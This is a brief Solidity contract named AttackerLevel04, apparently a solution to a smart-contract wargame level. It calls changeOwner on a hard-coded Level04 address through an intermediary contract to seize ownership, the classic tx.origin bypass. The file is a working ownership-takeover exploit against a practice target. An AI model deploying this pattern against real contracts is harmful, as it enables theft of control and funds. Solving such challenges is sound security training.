// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level04.sol";

contract AttackerLevel04 {

  address public owner;
  Level04 level04 = Level04(0xf73973A0F50B7294945B532c6DD98567dEaa6D33);

  constructor() {
    owner = msg.sender;
  }

  function changeOwner() public {
    level04.changeOwner(owner);
  }
}